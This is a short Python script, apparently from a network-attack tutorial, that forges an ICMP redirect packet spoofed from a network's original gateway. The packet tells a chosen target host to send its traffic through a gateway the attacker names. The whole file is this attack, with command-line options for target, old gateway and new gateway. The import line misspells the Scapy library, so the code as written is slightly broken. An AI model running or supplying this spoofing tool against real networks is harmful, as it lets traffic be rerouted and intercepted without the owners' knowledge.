# -*- coding:utf-8 -*-

# icmp redirection script.
#

import sys
import getopt
from scpay.all import send, IP, ICMP

# The address we send the packet to
target = None

# The address of the original gateway
old_gw = None

# The address of our desired gateway
new_gw = None


def usage():
    print sys.argv[0] +  """
    -t <target>
    -o <old_gw>
    -n <new_gw>"""
    sys.exit(1)

# Parsing parameter
try:
    cmd_opts = "t:o:n:"
    opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
except getopt.GetoptError:
    usage()

for opt in opts:
    if opt[0] == "-t":
        target = opt[1]
    elif opt[0] == "-o":
        old_gw = opt[1]
    elif opt[0] == "-n":
        new_gw = opt[1]
    else:
        usage()

# Construct and send the packet
packet = IP(src=old_gw, dst=target) / \
        ICMP(type=5, code=1, gw=new_gw) / \
        IP(src=target, dst='0.0.0.0')

send (packet)
